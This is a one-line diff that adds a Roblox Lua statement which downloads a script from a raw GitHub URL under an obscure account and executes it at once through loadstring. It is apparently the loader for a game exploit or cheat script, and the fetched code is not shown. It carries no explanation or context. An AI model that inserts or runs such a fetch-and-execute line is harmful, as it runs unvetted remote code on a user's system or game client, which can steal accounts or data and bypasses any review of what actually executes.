@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imaboy12321/ewqeqe4/main/eqweg"))()
